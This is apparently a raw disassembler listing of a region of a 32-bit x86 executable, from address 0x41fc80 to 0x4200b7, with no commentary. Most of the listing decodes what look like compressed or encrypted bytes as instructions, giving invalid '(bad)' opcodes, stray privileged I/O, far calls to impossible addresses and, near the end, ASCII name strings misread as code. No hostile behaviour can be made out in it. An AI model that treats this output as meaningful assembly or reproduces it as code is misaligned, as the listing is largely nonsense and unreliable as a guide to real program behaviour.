  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x38888c27
  41fc89:	jae    0x41fcbd
  41fc8b:	sub    BYTE PTR [ecx+0xad0001],0x0
  41fc92:	add    BYTE PTR [esi-0x67],bh
  41fc95:	rcl    DWORD PTR [esp+edi*8],0x23
  41fc99:	jl     0x41fd15
  41fc9b:	dec    edx
  41fc9c:	cmp    ecx,DWORD PTR [ebx-0x28]
  41fc9f:	push   ebp
  41fca0:	and    ch,dl
  41fca2:	sbb    eax,0x7cb4e792
  41fca7:	and    bh,BYTE PTR [esi]
  41fca9:	or     bh,ch
  41fcab:	xchg   ecx,eax
  41fcac:	sub    bh,BYTE PTR [edx-0x6b746ebc]
  41fcb2:	pop    DWORD PTR [ebx+0x20]
  41fcb5:	cmp    al,BYTE PTR [eax+eax*2-0xa8a0d9c]
  41fcbc:	out    dx,al
  41fcbd:	(bad)  
  41fcbe:	leave  
  41fcbf:	addr16 mov ch,0x2c
  41fcc2:	call   0xf84c:0xf0e9c8c7
  41fcc9:	pop    ebx
  41fcca:	cmp    eax,0x840ee823
  41fccf:	aam    0x96
  41fcd1:	shl    dl,1
  41fcd3:	int3   
  41fcd4:	fisub  WORD PTR [esi-0x12d4bcdd]
  41fcda:	push   esp
  41fcdb:	sbb    DWORD PTR [esi-0x5f],0x3e
  41fcdf:	pop    edi
  41fce0:	mov    eax,?
  41fce2:	cmp    ah,BYTE PTR [eax+0x16]
  41fce5:	popf   
  41fce6:	sub    bl,BYTE PTR [ebp+0x6b]
  41fce9:	push   edi
  41fcea:	inc    ebp
  41fceb:	pop    edi
  41fcec:	mov    bl,0x5f
  41fcee:	dec    DWORD PTR [ebp-0x1d]
  41fcf1:	jl     0x41fc9b
  41fcf3:	ret    
  41fcf4:	ss sar cl,0x80
  41fcf8:	sbb    eax,0xb78fda6
  41fcfd:	push   ss
  41fcfe:	or     bl,BYTE PTR [eax-0x7b]
  41fd01:	retf   0x86f5
  41fd04:	mov    dh,0x16
  41fd06:	push   ebx
  41fd07:	into   
  41fd08:	or     cl,BYTE PTR [edi-0x390ef1c0]
  41fd0e:	aaa    
  41fd0f:	mov    esi,0x50607525
  41fd14:	repz pop edi
  41fd16:	pminsw mm3,QWORD PTR [ebp-0x3a8b8135]
  41fd1d:	jno    0x41fce8
  41fd1f:	shl    DWORD PTR [edx],cl
  41fd21:	iret   
  41fd22:	push   esp
  41fd23:	add    eax,0x9dff6b86
  41fd28:	pushf  
  41fd29:	push   es
  41fd2a:	sbb    DWORD PTR [ecx+0x671f6787],ebx
  41fd30:	pop    ebx
  41fd31:	add    al,0x41
  41fd33:	adc    BYTE PTR [ebp-0x402282b4],bh
  41fd39:	pop    edi
  41fd3a:	(bad)  [ebx-0x5e]
  41fd3d:	and    al,0x70
  41fd3f:	jno    0x41fd41
	...
  41fd49:	add    BYTE PTR [eax],al
  41fd4b:	adc    dl,bh
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	add    ah,BYTE PTR [ebx+0x2d]
  41fd5a:	push   edx
  41fd5b:	sub    eax,0xad0001aa
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    BYTE PTR [esi],ch
  41fd64:	push   cs
  41fd65:	fild   WORD PTR [ecx]
  41fd67:	fwait
  41fd68:	in     al,dx
  41fd69:	inc    edx
  41fd6a:	in     al,0x91
  41fd6c:	xor    BYTE PTR [edi-0x8],0x3e
  41fd70:	shr    BYTE PTR [esi-0x51],1
  41fd73:	(bad)  [ebx]
  41fd75:	sbb    eax,0xee70787b
  41fd7a:	inc    edx
  41fd7b:	or     eax,ecx
  41fd7d:	xchg   esp,eax
  41fd7e:	dec    ebx
  41fd7f:	add    BYTE PTR [edi+0x7d7fdfb3],0x8c
  41fd86:	mov    esp,0x3dd5ec6a
  41fd8b:	and    al,0xf8
  41fd8d:	mov    eax,0xe85384b2
  41fd92:	fwait
  41fd93:	jg     0x41fd48
  41fd95:	hlt    
  41fd96:	retf   0x6b0
  41fd99:	jmp    0x41fd47
  41fd9b:	mov    WORD PTR [ecx+0x55],gs
  41fd9e:	xchg   ecx,eax
  41fd9f:	fsub   DWORD PTR [ebx]
  41fda1:	push   ecx
  41fda2:	mov    esi,0xdd1534a9
  41fda7:	sub    ebx,ecx
  41fda9:	sahf   
  41fdaa:	sub    esi,0x56f91283
  41fdb0:	sbb    DWORD PTR [esi],ebp
  41fdb2:	cs push 0x70864390
  41fdb8:	pop    edx
  41fdb9:	or     ebp,DWORD PTR [ebp-0x6]
  41fdbc:	repz (bad) 
  41fdbe:	mov    ebp,0x243d57a5
  41fdc3:	fstenv ds:0x1e641f57
  41fdca:	lods   eax,DWORD PTR ds:[esi]
  41fdcb:	call   DWORD PTR [edx-0x2f2bbab5]
  41fdd1:	mov    ebx,0x525aca77
  41fdd6:	inc    eax
  41fdd7:	cmp    dh,BYTE PTR ds:0xa14d99a8
  41fddd:	add    ebp,0xf188f3d6
  41fde3:	mov    DWORD PTR [ebx],edx
  41fde5:	(bad)  
  41fde6:	sbb    eax,0x8fb8c140
  41fdeb:	and    dh,BYTE PTR [eax-0x20]
  41fdee:	push   esi
  41fdef:	jg     0x41fda0
  41fdf1:	(bad)  
  41fdf2:	setns  dl
  41fdf5:	in     al,dx
  41fdf6:	aam    0x32
  41fdf8:	sub    DWORD PTR [eax],eax
  41fdfa:	pop    esi
  41fdfb:	dec    BYTE PTR [esi+eax*2+0x2406967b]
  41fe02:	shr    ah,1
  41fe04:	xor    eax,0x891310f8
  41fe09:	lock fbld TBYTE PTR [ecx]
  41fe0c:	sub    esp,DWORD PTR [edx]
  41fe0e:	mov    cl,0x1b
	...
  41fe18:	add    BYTE PTR [eax],al
  41fe1a:	add    BYTE PTR [edx],dl
  41fe1c:	mov    edx,0xe6f8c6d8
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	pop    ss
  41fe28:	xlat   BYTE PTR ds:[ebx]
  41fe29:	mov    bl,0xbe
  41fe2b:	fisubr DWORD PTR [edx+0xad0001]
  41fe31:	add    BYTE PTR [eax],al
  41fe33:	push   edi
  41fe34:	push   esi
  41fe35:	addr16 jg 0x41fddd
  41fe38:	jnp    0x41fe52
  41fe3a:	hlt    
  41fe3b:	ja     0x41fe15
  41fe3d:	aad    0xea
  41fe3f:	adc    eax,0xdfa3041a
  41fe44:	xor    edx,edi
  41fe46:	fnstcw WORD PTR [edx+0x11a326e6]
  41fe4c:	mov    cl,0x90
  41fe4e:	aad    0xae
  41fe50:	and    eax,DWORD PTR [ebx]
  41fe52:	mov    dl,0xaa
  41fe54:	es sti 
  41fe56:	mov    al,ds:0x3fa30902
  41fe5b:	popf   
  41fe5c:	int3   
  41fe5d:	xchg   BYTE PTR [edx-0x307cb19f],cl
  41fe63:	aad    0xcd
  41fe65:	imul   edi,edi,0x65be3153
  41fe6b:	frstor [ecx+0x51]
  41fe6e:	les    eax,FWORD PTR [edi-0x4e]
  41fe71:	mov    eax,ds:0x503784a0
  41fe76:	out    0x84,al
  41fe78:	mov    ecx,0x182dd25
  41fe7d:	pop    ds
  41fe7e:	icebp  
  41fe7f:	gs push es
  41fe81:	sbb    BYTE PTR [edi+0x68],0x50
  41fe85:	ret    
  41fe86:	push   ecx
  41fe87:	pop    edx
  41fe88:	(bad)  [ebp+0x23]
  41fe8b:	addr16 xchg ebp,eax
  41fe8d:	in     al,dx
  41fe8e:	call   0xeae06e0d
  41fe93:	outs   dx,DWORD PTR ds:[esi]
  41fe94:	popf   
  41fe95:	inc    ecx
  41fe96:	inc    edi
  41fe97:	adc    al,0xf2
  41fe99:	dec    esi
  41fe9a:	enter  0xfd20,0xd7
  41fe9e:	aad    0x28
  41fea0:	cmp    BYTE PTR [edx+0xd],dh
  41fea3:	bound  ebp,QWORD PTR [edi]
  41fea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fea6:	sti    
  41fea7:	and    eax,0x7fa18d
  41feac:	repnz sbb BYTE PTR [eax+0x3727fbb3],ch
  41feb3:	push   0xe34837a1
  41feb8:	hlt    
  41feb9:	dec    ebx
  41feba:	add    esp,DWORD PTR [esi+0x45]
  41febd:	loopne 0x41fe77
  41febf:	repz aaa 
  41fec1:	sbb    DWORD PTR [bx+0x0],edx
  41fec5:	daa    
  41fec6:	test   eax,0xec7ebf38
  41fecb:	xlat   BYTE PTR ds:[ebx]
  41fecc:	in     al,0xb2
  41fece:	stos   BYTE PTR es:[edi],al
  41fecf:	pusha  
  41fed0:	jecxz  0x41fec0
  41fed2:	sub    ecx,0x66b60cc4
  41fed8:	add    al,bh
  41feda:	push   eax
  41fedb:	push   0xc5fae8c3
	...
  41feec:	nop
  41feed:	inc    edx
  41feee:	add    BYTE PTR [eax+edx*4],al
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
